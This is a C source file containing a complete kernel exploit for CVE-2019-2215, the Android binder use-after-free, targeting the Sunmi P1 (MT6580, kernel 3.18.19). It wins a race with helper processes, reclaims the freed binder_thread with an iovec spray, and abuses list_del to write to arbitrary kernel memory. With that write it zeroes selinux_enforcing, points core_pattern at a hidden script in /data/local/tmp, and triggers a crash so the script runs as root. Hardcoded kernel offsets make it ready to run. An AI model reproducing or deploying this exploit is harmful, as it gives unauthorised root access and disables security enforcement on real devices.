/* Sunmi P1 (W6900, MT6580 / Linux 3.18.19 armv7) - CVE-2019-2215 binder UAF exploit
 *
 * Run it in the *app* domain (run-as <pkg>), not as shell: shell lacks binder call rights
 * for some operations; an untrusted_app is fine. Nothing here needs a binder node or the
 * transfer permission.
 *
 * Chain:
 *  1. binder_poll registers the epoll entry on poll_wait(&thread->wait) only while
 *     transaction_stack != 0 && todo == empty. We reach that state by sending a synchronous
 *     transaction (write only) and reading back ONLY the completion (which does not pop the
 *     stack). A helper process first floods the single-threaded servicemanager with a ~1MB
 *     transaction so its reply cannot arrive before we finish the read + epoll_ctl(ADD).
 *  2. BINDER_THREAD_EXIT kfree()s that binder_thread while the epoll entry still points into
 *     its waitqueue.
 *  3. The freed chunk is reclaimed by an iovec array that recvmsg() kmallocs (32 entries = 256
 *     bytes = kmalloc-256 == sizeof(struct binder_thread) 0xFC). We spray 16 such arrays and
 *     keep them alive, so one is guaranteed to sit on the chunk.
 *  4. epoll_ctl(DEL) runs remove_wait_queue() on the freed waitqueue: list_del writes the
 *     chunk address over that array's iov[6] = {iov_base, iov_len}. Sending the crafted
 *     two-stage payload to every spray socket makes the winner write arbitrary data to an
 *     arbitrary kernel address.
 *  5. Endgame: selinux_enforcing = 0 and core_pattern = "|/data/local/tmp/.r.sh", then crash a
 *     process: do_coredump() runs the helper as root.
 *
 * Offsets recovered from the device's own kernel image (base 0xc0008000, no KASLR):
 *   sizeof(struct binder_thread) = 0xFC, wait.lock @ 0x2C, wait.task_list @ 0x30/0x34
 *   selinux_enforcing = 0xc0e44738      core_pattern = 0xc0cdf4c4
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/epoll.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <sys/resource.h>

/* ---- binder protocol (armv7 values, verified against the kernel switch) ---- */
#define BINDER_WRITE_READ        0xc0186201
#define BINDER_VERSION           0xc0046209
#define BINDER_SET_MAX_THREADS   0x40046205
#define BC_TRANSACTION           0x40286300
#define BC_ENTER_LOOPER          0x630c
#define BR_REPLY_CMD             0x80287203
#define BR_TRANSACTION_CMD       0x80287202
#define BR_TRANSACTION_COMPLETE  0x7206
#define BR_FAILED_REPLY          0x7211
#define BR_DEAD_REPLY            0x7205
#define BINDER_TYPE_BINDER       1
#define BINDER_THREAD_EXIT       0x40046208

#define SELINUX_ENFORCING        0xc0e44738u
#define CORE_PATTERN             0xc0cdf4c4u

/* iovec index maths: 8-byte iovec; wait.lock @0x2C = iov[5].iov_len,
 * wait.task_list.next @0x30 = iov[6].iov_base */
#define IOV_NR        32
#define IOV_WQ_LOCK   5
#define IOV_WQ        6
#define SPRAY_N       16

struct binder_write_read {
    unsigned int write_size, write_consumed, write_buffer;
    unsigned int read_size, read_consumed, read_buffer;
};
struct binder_transaction_data {
    unsigned int target_handle_or_ptr, cookie, code, flags;
    unsigned int sender_pid, sender_euid, data_size, offsets_size;
    unsigned int data_buffer, data_offsets;
};

static int g_iov_nr = IOV_NR;   /* tunable: kmalloc bucket probe */
static unsigned int g_wq_next, g_wq_prev;   /* values list_del() will use */
static int binder_fd = -1;
static int epfd = -1;
static void on_alarm(int s) { (void)s; }

static void die(const char *m) { perror(m); exit(1); }

static int binder_bwr(int fd, void *wbuf, unsigned int wsize, void *rbuf, unsigned int rsize)
{
    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = wsize;
    bwr.write_buffer = (unsigned int)(unsigned long)wbuf;
    bwr.read_size = rsize;
    bwr.read_buffer = (unsigned int)(unsigned long)rbuf;
    if (ioctl(fd, BINDER_WRITE_READ, &bwr) < 0) return -1;
    return (int)bwr.read_consumed;   /* binder reports the byte count here */
}

static int put_string16(unsigned char *d, int off, const char *str)
{
    int i, n = strlen(str);
    *(unsigned int *)(d + off) = n; off += 4;
    for (i = 0; i < n; i++) { d[off++] = str[i]; d[off++] = 0; }
    d[off++] = 0; d[off++] = 0;            /* trailing NUL, not counted */
    while (off % 4) d[off++] = 0;          /* keep object offsets 4-byte aligned */
    return off;
}

static void binder_setup(int fd)
{
    static int done = 0;
    int vers = 0;
    unsigned int maxthreads = 15;
    void *m;
    if (done) return;
    ioctl(fd, BINDER_VERSION, &vers);
    ioctl(fd, BINDER_SET_MAX_THREADS, &maxthreads);
    m = mmap(NULL, 1024 * 1024, PROT_READ, MAP_PRIVATE | MAP_NORESERVE, fd, 0);
    if (m == MAP_FAILED) perror("mmap binder");
    done = 1;
}

static void hexdump(const unsigned char *b, int n)
{
    int i, j;
    for (i = 0; i < n; i += 16) {
        fprintf(stderr, "%04x: ", i);
        for (j = 0; j < 16 && i + j < n; j++) fprintf(stderr, "%02x ", b[i + j]);
        fprintf(stderr, "\n");
    }
}

static void pincpu(void)
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(0, &set);
    sched_setaffinity(0, sizeof(set), &set);
}

/* ---- servicemanager lookup (CHECK_SERVICE): gives us a usable handle ---- */
static int svc_handle(int fd, const char *name, int strict)
{
    static unsigned char data[256];
    static unsigned char rbuf[2048];
    static unsigned int wbuf[1 + sizeof(struct binder_transaction_data) / 4];
    struct binder_transaction_data *t;
    const char *tok = "android.os.IServiceManager";
    int off = 0, i, n, h = -1;

    if (strict) { *(unsigned int *)(data + off) = 0; off += 4; }
    off = put_string16(data, off, tok);
    off = put_string16(data, off, name);

    memset(wbuf, 0, sizeof(wbuf));
    *(unsigned int *)wbuf = BC_TRANSACTION;
    t = (struct binder_transaction_data *)(wbuf + 1);
    t->target_handle_or_ptr = 0;             /* servicemanager */
    t->code = 1;                             /* CHECK_SERVICE */
    t->data_size = off;
    t->data_buffer = (unsigned int)(unsigned long)data;
    if (ioctl(fd, BINDER_WRITE_READ, &(struct binder_write_read){
            .write_size = sizeof(wbuf), .write_buffer = (unsigned int)(unsigned long)wbuf,
            .read_size = 0, .read_buffer = 0 }) < 0) return -1;

    memset(rbuf, 0, sizeof(rbuf));
    alarm(3);
    n = binder_bwr(fd, NULL, 0, rbuf, sizeof(rbuf));
    alarm(0);
    if (n <= 0) return -1;
    for (i = 0; i + 4 <= n; ) {
        unsigned int cmd = *(unsigned int *)(rbuf + i);
        if (cmd == BR_REPLY_CMD) {
            struct binder_transaction_data *r = (void *)(rbuf + i + 4);
            unsigned char *base = (unsigned char *)(unsigned long)r->data_buffer;
            unsigned int *offs = (unsigned int *)(unsigned long)r->data_offsets;
            unsigned int k;
            for (k = 0; k < r->offsets_size / 4; k++) {
                unsigned int v = *(unsigned int *)(base + offs[k] + 8);   /* handle at +8 */
                if (v) h = (int)v;
            }
            i += 4 + sizeof(struct binder_transaction_data);
        } else i += 4;
    }
    return h;
}

/* ---- helper process: delay the target's reply so we can win the race ---- */
static void delay_child(void)
{
    static unsigned char big[1024 * 1024];
    static unsigned int wbuf[1 + sizeof(struct binder_transaction_data) / 4];
    struct binder_transaction_data *t;
    int myfd = open("/dev/binder", O_RDWR);
    if (myfd < 0) _exit(1);
    binder_setup(myfd);
    memset(big, 0x41, sizeof(big));
    memset(wbuf, 0, sizeof(wbuf));
    *(unsigned int *)wbuf = BC_TRANSACTION;
    t = (struct binder_transaction_data *)(wbuf + 1);
    t->target_handle_or_ptr = 0;      /* servicemanager is single threaded */
    t->data_size = sizeof(big);
    t->data_buffer = (unsigned int)(unsigned long)big;
    ioctl(myfd, BINDER_WRITE_READ, &(struct binder_write_read){
            .write_size = sizeof(wbuf), .write_buffer = (unsigned int)(unsigned long)wbuf,
            .read_size = 0, .read_buffer = 0 });
    _exit(0);
}

/* ---- get binder_poll onto the vulnerable branch and register the epoll entry ---- */
static int force_thread_path(int fd)
{
    static unsigned int wbuf[1 + sizeof(struct binder_transaction_data) / 4];
    static unsigned char rbuf[512];
    static unsigned int self_data = 0x12345678;
    static unsigned char junk[256];
    struct binder_transaction_data *t;
    unsigned int enter = BC_ENTER_LOOPER;
    int n, i, h, replied = 0, k;

    binder_setup(fd);
    binder_bwr(fd, &enter, 4, NULL, 0);
    h = svc_handle(fd, "activity", 1);
    if (h <= 0) h = 1;

    /* drain leftovers so todo is empty */
    for (k = 0; k < 8; k++) {
        memset(junk, 0, sizeof(junk));
        alarm(1);
        n = binder_bwr(fd, NULL, 0, junk, sizeof(junk));
        alarm(0);
        if (n <= 0) break;
    }

    if (fork() == 0) delay_child();
    usleep(3000);

    /* synchronous, write only: thread->transaction_stack = t, completion queued */
    memset(wbuf, 0, sizeof(wbuf));
    *(unsigned int *)wbuf = BC_TRANSACTION;
    t = (struct binder_transaction_data *)(wbuf + 1);
    t->target_handle_or_ptr = (unsigned int)h;
    t->code = 0;
    t->data_size = 4;
    t->data_buffer = (unsigned int)(unsigned long)&self_data;
    if (ioctl(fd, BINDER_WRITE_READ, &(struct binder_write_read){
            .write_size = sizeof(wbuf), .write_buffer = (unsigned int)(unsigned long)wbuf,
            .read_size = 0, .read_buffer = 0 }) < 0) { perror("txn"); return -1; }

    /* consume only the completion: reading it does not pop transaction_stack */
    memset(rbuf, 0, sizeof(rbuf));
    n = binder_bwr(fd, NULL, 0, rbuf, sizeof(rbuf));
    for (i = 0; i + 4 <= n; ) {
        unsigned int cmd = *(unsigned int *)(rbuf + i);
        if (cmd == BR_REPLY_CMD) replied = 1;
        i += (cmd == BR_REPLY_CMD) ? 4 + sizeof(struct binder_transaction_data) : 4;
    }
    if (replied) return -1;                 /* race lost: caller retries */

    {   /* register while binder_poll still takes the thread branch */
        struct epoll_event ev;
        memset(&ev, 0, sizeof(ev));
        ev.events = EPOLLIN;
        if (epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev) < 0) perror("epoll ADD");
    }
    return 0;
}

/* ---- spray child: park a kernel-side iovec array on the freed chunk ----
 *
 * import_iovec() kmallocs g_iov_nr * 8 bytes for the kernel copy of this array whenever
 * g_iov_nr > UIO_FASTIOV (8), and that kmalloc is the reclaim of the freed binder_thread.
 * The child then blocks in recvmsg, so the array stays alive while the DEL runs.
 *
 * The DEL -> remove_wait_queue() -> list_del(&wait->task_list) then performs:
 *     *(wait.task_list.next + 4) = wait.task_list.prev
 * task_list is at 0x30 (iov[6].iov_base) / 0x34 (iov[6].iov_len), so pointing
 * next at target-4 and putting the value in prev writes value to target.
 */
static void spray_child(int bar, int sock)
{
    struct iovec iov[g_iov_nr];
    struct msghdr msg;
    char c;

    pincpu();                                   /* must allocate on the CPU that freed it */
    if (read(bar, &c, 1) != 1) _exit(1);        /* released right after the free */
    memset(iov, 0, sizeof(iov));
    iov[IOV_WQ_LOCK].iov_base = 0;
    iov[IOV_WQ_LOCK].iov_len = 0;               /* wait.lock = 0, else the DEL spins */
    iov[IOV_WQ].iov_base = (void *)(unsigned long)g_wq_next;   /* next  -> target-4   */
    iov[IOV_WQ].iov_len = g_wq_prev;                           /* prev  -> the value  */
    memset(&msg, 0, sizeof(msg));
    msg.msg_iov = iov;
    msg.msg_iovlen = g_iov_nr;
    recvmsg(sock, &msg, 0);                     /* blocks holding the kernel array */
    _exit(0);
}

/* one attempt: reclaim the freed thread and let the DEL perform the write.
   returns 1 on a hit (the DEL completed => the write happened). */
static int kw4(unsigned int target, unsigned int value)
{
    int bar[SPRAY_N][2], sp[SPRAY_N][2];
    pid_t kids[SPRAY_N], del_pid;
    int i, st;

    /* list_del's second store writes to 'value' as an address: keep it mapped */
    if (value >= 0x1000 && value < 0xbf000000)
        mmap((void *)(value & ~0xfffu), 0x1000, PROT_READ | PROT_WRITE,
             MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);

    g_wq_next = target - 4;
    g_wq_prev = value;

    /* a missed DEL spins holding the epoll mutex, so each attempt needs a fresh epfd */
    if (epfd >= 0) close(epfd);
    epfd = epoll_create(1000);
    if (epfd < 0) return 0;

    if (force_thread_path(binder_fd) != 0) return 0;   /* race lost */

    for (i = 0; i < SPRAY_N; i++) {
        if (pipe(bar[i]) || socketpair(AF_UNIX, SOCK_STREAM, 0, sp[i])) return 0;
        kids[i] = fork();
        if (kids[i] == 0) {
            close(bar[i][1]); close(sp[i][1]);
            spray_child(bar[i][0], sp[i][0]);
        }
        close(bar[i][0]); close(sp[i][0]);
    }

    ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);        /* free binder_thread */
    for (i = 0; i < SPRAY_N; i++) write(bar[i][1], "x", 1);   /* reclaim now */
    usleep(120000);

    del_pid = fork();
    if (del_pid == 0) {
        struct epoll_event ev;
        memset(&ev, 0, sizeof(ev));
        ev.events = EPOLLIN;
        epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &ev);   /* this is what writes */
        _exit(0);
    }
    usleep(250000);

    if (waitpid(del_pid, &st, WNOHANG) == del_pid) {
        printf("[+] HIT  *(0x%08x) = 0x%08x   (segs=%d)\n", target, value, g_iov_nr);
        for (i = 0; i < SPRAY_N; i++) close(bar[i][1]);
        for (i = 0; i < SPRAY_N; i++) waitpid(kids[i], NULL, WNOHANG);
        return 1;
    }
    printf("[-] miss (DEL spinning) segs=%d\n", g_iov_nr);
    return 0;
}

/* write a NUL-terminated string, one 4-byte list_del write at a time */
static int kwstr(unsigned int target, const char *s)
{
    unsigned int i, n = strlen(s) + 1, f;
    for (i = 0; i < n; i += 4) {
        f = 0;
        memcpy(&f, s + i, (n - i) >= 4 ? 4 : (n - i));
        {
            int attempt, ok = 0;
            for (attempt = 0; attempt < 6 && !ok; attempt++)
                ok = kw4(target + i, f);
            if (!ok) return -1;
        }
    }
    return 0;
}

/* ---- diagnostic: does the UAF land on our iovec array? ---- */
static int leak_test(void)
{
    struct iovec iov[g_iov_nr];
    char *dummy, *fill, *buf, *sh;
    int attempt;

    pincpu();
    dummy = mmap(NULL, 0x2000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (dummy == MAP_FAILED) die("mmap");
    memset(dummy, 0x41, 0x2000);
    sh = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (sh == MAP_FAILED) die("mmap shared");
    fill = malloc(0x1000);
    buf = malloc(0x1000);
    if (!fill || !buf) die("malloc");
    memset(fill, 0x42, 0x1000);

    for (attempt = 1; attempt <= 40; attempt++) {
        int pfd[2], n, i, miss;
        pid_t pid;

        memset(sh, 0, 0x1000);
        if (pipe(pfd)) die("pipe");
        fcntl(pfd[0], F_SETPIPE_SZ, 0x1000);
        if (write(pfd[1], fill, 0x1000) != 0x1000) die("prefill");

        force_thread_path(binder_fd);      /* state + epoll entry on thread->wait */

        memset(iov, 0, sizeof(iov));
        iov[IOV_WQ_LOCK].iov_len = 0;
        iov[IOV_WQ].iov_base = dummy;
        iov[IOV_WQ].iov_len = 0x1000;

        pid = fork();
        if (pid < 0) die("fork");
        if (pid == 0) {
            close(pfd[1]);
            usleep(200000);
            epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, NULL);
            if (read(pfd[0], buf, 0x1000) != 0x1000) _exit(1);
            usleep(100000);
            n = read(pfd[0], sh, 0x1000);
            _exit(n > 0 ? 0 : 1);
        }
        close(pfd[0]);
        ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
        n = writev(pfd[1], iov, g_iov_nr);
        waitpid(pid, NULL, 0);
        close(pfd[1]);

        miss = 1;
        for (i = 0; i < 0x1000; i++) if (sh[i] != 0x41) { miss = 0; break; }
        printf("attempt %2d: writev=%d %s [0x30]=%08x [0x34]=%08x\n", attempt, n,
               miss ? "MISS (our page)" : "HIT!",
               *(unsigned int *)(sh + 0x30), *(unsigned int *)(sh + 0x34));
        if (!miss) { hexdump((unsigned char *)sh, 0x80); return 0; }
    }
    printf("[-] no hit\n");
    return 1;
}

static void show(const char *path, const char *label)
{
    char buf[200];
    int fd = open(path, O_RDONLY);
    if (fd < 0) { printf("[?] %s: %s\n", label, strerror(errno)); return; }
    memset(buf, 0, sizeof(buf));
    if (read(fd, buf, sizeof(buf) - 1) < 0) { close(fd); return; }
    close(fd);
    printf("[%s] %s", label, buf);
    if (buf[0] && buf[strlen(buf) - 1] != '\n') printf("\n");
}

int main(int argc, char **argv)
{
    const char *pat = "|/data/local/tmp/.r.sh";

    {   /* musl's signal() sets SA_RESTART, which would make interrupted reads restart */
        struct sigaction sa;
        memset(&sa, 0, sizeof(sa));
        sa.sa_handler = on_alarm;
        sa.sa_flags = 0;
        sigaction(SIGALRM, &sa, NULL);
    }
    pincpu();

    binder_fd = open("/dev/binder", O_RDWR);
    if (binder_fd < 0) die("open /dev/binder");
    epfd = epoll_create(1000);
    if (epfd < 0) die("epoll_create");

    if (argc > 2) g_iov_nr = atoi(argv[2]);
    if (argc > 1 && !strcmp(argv[1], "leak")) {
        printf("[*] iovec array: %d segs = %d bytes\n", g_iov_nr, g_iov_nr * 8);
        return leak_test();
    }

    if (argc > 3 && !strcmp(argv[1], "w")) {
        unsigned int a = strtoul(argv[3], 0, 0), v = strtoul(argv[4], 0, 0);
        printf("[*] write test: *(0x%08x) = 0x%08x  (segs=%d)\n", a, v, g_iov_nr);
        return kw4(a, v) ? 0 : 1;
    }

    printf("[*] Sunmi P1 / MT6580 / 3.18.19 armv7 - CVE-2019-2215\n");
    show("/sys/fs/selinux/enforce", "selinux before");

    printf("[*] write test: *(0x%08x) = 0   (segs=%d)\n", SELINUX_ENFORCING, g_iov_nr);
    if (!kw4(SELINUX_ENFORCING, 0)) {
        printf("[-] reclaim missed at %d segs - rerun with a different size\n", g_iov_nr);
        return 1;
    }
    show("/sys/fs/selinux/enforce", "selinux after");

    printf("[*] patching core_pattern @ 0x%08x = \"%s\"\n", CORE_PATTERN, pat);
    kwstr(CORE_PATTERN, pat);

    printf("[*] triggering a crash so the kernel runs the helper as root\n");
    {
        pid_t p = fork();
        if (p == 0) {
            struct rlimit rl;
            rl.rlim_cur = rl.rlim_max = RLIM_INFINITY;   /* Android defaults to 0 = no core dump */
            setrlimit(RLIMIT_CORE, &rl);
            { volatile int *x = (volatile int *)0; *x = 1; }
            _exit(0);
        }
        if (p > 0) waitpid(p, NULL, 0);
    }
    sleep(2);
    printf("[+] done - helper log:\n");
    show("/data/local/tmp/.rout", "rout");
    return 0;
}



